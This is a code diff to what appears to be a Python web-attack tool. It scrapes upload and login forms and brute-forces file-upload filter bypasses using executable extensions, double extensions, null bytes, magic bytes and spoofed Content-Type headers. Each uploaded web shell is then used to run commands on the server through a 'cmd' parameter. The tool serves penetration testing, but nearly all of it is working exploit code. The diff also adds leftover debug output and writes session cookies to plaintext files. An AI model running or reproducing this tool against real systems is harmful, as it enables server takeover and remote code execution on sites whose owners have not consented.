@@ -11,37 +11,145 @@ import json
 import urllib
 from urllib.parse import urlparse
 import bs4 as bs
-from urllib import request
+import requests.cookies
+import pickle
+from requests_html import HTMLSession
+
+
+def save_cookies(session, filename):
+    with open(filename, 'wb') as f:
+        f.truncate()
+        pickle.dump(session.cookies._cookies, f)
+
+
+def load_cookies(session, filename):
+    with open(filename, 'rb') as f:
+        cookies = pickle.load(f)
+
+        if cookies:
+            jar = requests.cookies.RequestsCookieJar()
+            jar._cookies = cookies
+            session.cookies = jar
+            with open("fancy_cookie.txt", 'w') as fancy:
+                fancy.write(str(cookies))
+        else:
+            return False
 
 
 def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location, username,
-         password, data, file_attr):
-    # Basic Authentication
+         password):
+    try:
+        # Basic Authentication
 
-    sauce = urllib.request.urlopen(URL).read()
-    soup = bs.BeautifulSoup(sauce, "html.parser")
-    form = soup.find('form')
-    username_attr = form.find('input', type='text').get('name')
+        session = HTMLSession()
+        sauce = session.get(URL)
+        soup = bs.BeautifulSoup(sauce.html.html, "html.parser")
+        form = soup.find('form')
+        username_attr = form.find('input', type='text').get('name')
+        password_attr = form.find('input', type='password').get('name')
+        submit_attr = form.find('input', type='submit').get('name')
 
-    sauce = urllib.request.urlopen(URL).read()
-    soup = bs.BeautifulSoup(sauce, "html.parser")
-    form = soup.find('form')
-    password_attr = form.find('input', type='password').get('name')
+        data = {
+            f'{username_attr}': f'{username}',
+            f'{password_attr}': f'{password}',
+            f'{submit_attr}': f'submit'
+        }
 
-    payload = {
-        f'{username_attr}': f'{username}',
-        f'{password_attr}': f'{password}'
-    }
+        session = requests.Session()
+        response = session.post(URL, allow_redirects=True)
+        session.post(response.url, data=data, allow_redirects=True)
+        save_cookies(session, "cookies.txt")
 
-    session = requests.Session()
-    session.post(URL, data=payload)
+        with open("cookie.txt", 'w') as f:
+            f.write(f"first, {session.cookies.get_dict()}")
 
+        load_cookies(session, "cookies.txt")
+
+        if data == {}:
+            print("Server responded with an empty page!")
+            sys.exit(1)
+
+        else:
+            attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
+                       session)
+
+    except requests.exceptions.RequestException as error:
+        raise SystemExit(error)
+
+
+def attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
+               session):
+    # HTML Scraper for applying all attributes for a website for better accuracy
+
+    request = session.post(URL)
+    response = request.text
+    soup = bs.BeautifulSoup(response, "html.parser")
+    slicing = soup.find_all("input")
+    soup.find('input', type='submit').get('name')
+    slicing = str(slicing).replace("[", "").replace("]", "")
+    slicing = slicing.split(", ")
+    data = {}
+    file_attr = ""
+
+    start_name = 'name="'
+    end_name = '"'
+    start_value = 'value="'
+    end_value = '"'
+
+    name = ""
+    value = ""
+
+    for i in slicing:
+
+        if 'hidden' in i:
+            attribute = str(i)
+            attribute = attribute.split(" ")
+
+            for j in attribute:
+
+                if "name" in j:
+                    name = j[j.find(start_name) + len(start_name):j.rfind(end_name)]
+
+                if "value" in j:
+                    value = j[j.find(start_value) + len(start_value):j.rfind(end_value)]
+
+            attribute_dictionary = "{" + '"' + str(name) + '"' + ": " + '"' + str(value) + '"' + "}"
+            hidden_attr = json.loads(attribute_dictionary)
+            data.update(hidden_attr)
+
+        if 'file' in i:
+            attribute = str(i)
+            attribute = attribute.split(" ")
+
+            for j in attribute:
+
+                if "name" in j:
+                    file_attr = j[j.find(start_name) + len(start_name):j.rfind(end_name)]
+
+        if 'submit' in i:
+            attribute = str(i)
+            attribute = attribute.split(" ")
+
+            for j in attribute:
+
+                if "name" in j:
+                    name = j[j.find(start_value) + len(start_value):j.rfind(end_value)]
+
+            attribute_dictionary = "{" + '"' + str(name) + '"' + ": " + '"' + "submit" + '"' + "}"
+            submit = json.loads(attribute_dictionary)
+            data.update(submit)
+
+    # print(data)
     file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
-                   session, data, file_attr)
+                   session, file_attr, data)
+
+    if data == {}:
+        print("Server responded with an empty page!")
+        sys.exit(1)
 
 
 def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
-                   session, data, file_attr):
+                   session, file_attr, data):
     # Brute forcing different extensions and uppercase extensions
 
     try:
@@ -60,18 +168,6 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
         coldfusion = [".cfm", ".cfml", ".cfc", ".dbm", ".cFm", ".cFml", ".cFc", ".dBm"]
         perl = [".pl", ".cgi", ".pL", ".cGi"]
 
-        if file_attr == 'optional':
-
-            response = session.get(URL, allow_redirects=False)
-            sauce = response.text
-            soup = bs.BeautifulSoup(sauce, "html.parser")
-            form = soup.find('form')
-            file_attr = form.find('input', type='file').get('name')
-            file_attr = str(file_attr)
-
-            if file_attr == "None":
-                file_attr = 'image'
-
         counter = 0
 
         print("[-] Trying different file extensions. Please be patient!")
@@ -86,9 +182,10 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
                 f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
             }
 
-            response = session.post(URL, files=files, headers=headers, data=data, allow_redirects=False,
-                                    proxies=proxies,
-                                    verify=TLS)
+            data.update(files)
+
+            response = session.post(URL, files=files, headers=headers, data=data, proxies=proxies,
+                                    allow_redirects=False, verify=TLS)
 
             print(f"[-] Trying differet {EXTENSION} extensions!")
             print(f"[-] Try {counter} with: {filename_ext}")
@@ -116,13 +213,13 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
-                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
+                            response = session.get(final_url, allow_redirects=False, headers=headers, data=data,
                                                    proxies=proxies, verify=TLS)
                             print(f"URL is: {final_url}")
                             print(response.text)
 
                         except KeyboardInterrupt:
-                            print("KeyboardInterrupt exception is caught!")
+                            print("\nKeyboardInterrupt exception is caught!")
                             break
 
                 else:
@@ -178,9 +275,10 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
             'submit': (None, 'Upload Image')
         }
 
-        response = session.post(URL, files=files, headers={
+        load_cookies(session, "cookies.txt")
+        response = session.post(URL, allow_redirects=False, data=data, files=files, headers={
             "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"},
-                                allow_redirects=False, proxies=proxies, verify=TLS)
+                                proxies=proxies, verify=TLS)
 
         print(f"[-] Try {counter} with: {filename_ext}")
 
@@ -206,13 +304,13 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
                         domain = urlparse(URL).netloc
                         final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
-                        response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
+                        response = session.get(final_url, headers=headers, data=data,
                                                proxies=proxies, verify=TLS)
                         print(f"URL is: {final_url}")
                         print(response.text)
 
                     except KeyboardInterrupt:
-                        print("KeyboardInterrupt exception is caught!")
+                        print("\nKeyboardInterrupt exception is caught!")
                         break
 
             else:
@@ -267,8 +365,8 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
                 'submit': (None, 'Upload Image')
             }
 
-            response = session.post(URL, files=files, headers=headers, data=data,
-                                    allow_redirects=False, proxies=proxies, verify=TLS)
+            response = session.post(URL, files=files, allow_redirects=False, headers=headers, data=data,
+                                    proxies=proxies, verify=TLS)
 
             print(f"[-] Try {counter} with: {filename_ext}")
 
@@ -295,13 +393,13 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
-                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
+                            response = session.get(final_url, allow_redirects=False, headers=headers,
                                                    proxies=proxies, verify=TLS)
                             print(f"URL is: {final_url}")
                             print(response.text)
 
                         except KeyboardInterrupt:
-                            print("KeyboardInterrupt exception is caught!")
+                            print("\nKeyboardInterrupt exception is caught!")
                             break
 
                 else:
@@ -374,8 +472,8 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                 'submit': (None, 'Upload Image')
             }
 
-            response = session.post(URL, files=files, headers=headers, data=data,
-                                    allow_redirects=False, proxies=proxies, verify=TLS)
+            response = session.post(URL, files=files, allow_redirects=False, headers=headers, data=data,
+                                    proxies=proxies, verify=TLS)
 
             if verbosity:
                 print(response.text)
@@ -402,13 +500,13 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
-                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
+                            response = session.get(final_url, headers=headers, allow_redirects=False,
                                                    proxies=proxies, verify=TLS)
                             print(f"URL is: {final_url}")
                             print(response.text)
 
                         except KeyboardInterrupt:
-                            print("KeyboardInterrupt exception is caught!")
+                            print("\nKeyboardInterrupt exception is caught!")
                             break
 
                 else:
@@ -441,8 +539,8 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                 'submit': (None, 'Upload Image')
             }
 
-            response = session.post(URL, files=files, headers=headers, data=data,
-                                    allow_redirects=False, proxies=proxies, verify=TLS)
+            response = session.post(URL, files=files, headers=headers, allow_redirects=False, data=data,
+                                    proxies=proxies, verify=TLS)
 
             if verbosity:
                 print(response.text)
@@ -467,13 +565,13 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
-                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
+                            response = session.get(final_url, headers=headers, allow_redirects=False,
                                                    proxies=proxies, verify=TLS)
                             print(f"URL is: {final_url}")
                             print(response.text)
 
                         except KeyboardInterrupt:
-                            print("KeyboardInterrupt exception is caught!")
+                            print("\nKeyboardInterrupt exception is caught!")
                             break
 
                 else:
@@ -516,8 +614,8 @@ def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_
                 'submit': (None, 'Upload Image')
             }
 
-            response = session.post(URL, files=files, headers=headers, data=data,
-                                    allow_redirects=False, proxies=proxies, verify=TLS)
+            response = session.post(URL, files=files, headers=headers, allow_redirects=False, data=data,
+                                    proxies=proxies, verify=TLS)
 
             if verbosity:
                 print(response.text)
@@ -541,14 +639,14 @@ def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}shell.{EXTENSION}?cmd={cmd_encoded}"
 
-                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
+                            response = session.get(final_url, allow_redirects=False, headers=headers, data=data,
                                                    proxies=proxies,
                                                    verify=TLS)
                             print(f"URL is: {final_url}")
                             print(response.text)
 
                         except KeyboardInterrupt:
-                            print("KeyboardInterrupt exception is caught!")
+                            print("\nKeyboardInterrupt exception is caught!")
                             break
 
                 else:
@@ -567,7 +665,7 @@ def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_
                 else:
                     sys.exit(1)
 
-    print("[*] Some websites check for specific form elements and attributes so if everything fails, you may want to supply these parameters:\n[*] Supply the name for the type=\"file\" attribute with --file option.\n [*] Supply form data with -d option. \n [*] Change the URL to the value of Action attribute.\n If you don't know where to find these parameters, check the page source.")
+    print("second", session.cookies.get_dict())
 
 
 def main():
@@ -593,14 +691,6 @@ def main():
 
     parser.add_option('-H', "--header", type="string", dest="header",
                       help='(Optional) - for example: \'"X-Forwarded-For": "10.10.10.10"\' - Use double quotes and wrapp it with single quotes. Use comma to separate multi headers.',
-                      default="optional")
-
-    parser.add_option('-d', "--data", type="string", dest="data",
-                      help='(Optional) - Form data for example: \'"submit": "submit"\' - Use double quotes and wrapp it with single quotes. Use comma to separate multi data.',
-                      default="optional")
-
-    parser.add_option('-f', "--file", type="string", dest="file_attr",
-                      help='(Optional) - File type attribute name for example: -f myfile. Some website might check that (You check the browser page source).',
                       default="optional")
 
     parser.add_option('-l', "--location", type="string", dest="location",
@@ -636,10 +726,8 @@ def main():
     proxy = options.proxy
     TLS = options.ssl
     brute_force = options.continue_brute
-    file_attr = options.file_attr
     username = options.username
     password = options.password
-    data = options.data
     verbosity = options.verbosity
     location = options.location
 
@@ -681,16 +769,6 @@ def main():
             "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
         }
 
-    if data != 'optional':
-
-        temp_data = "{" + str(data) + "}"
-        data = json.loads(temp_data)
-
-    else:
-        data = {
-            "dummy": "dummy"
-        }
-
     positional_args = [URL, SUCCESS, EXTENSION, ALLOWED_EXT]
 
     if len(sys.argv) < 2:
@@ -708,12 +786,13 @@ def main():
             if username != 'optional' and password != 'optional':
 
                 auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
-                     location, username, password, data, file_attr)
+                     location, username, password)
 
             else:
                 session = requests.Session()
-                file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
-                               location, session, data, file_attr)
+                attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
+                           location,
+                           session)
 
 
 if __name__ == "__main__":
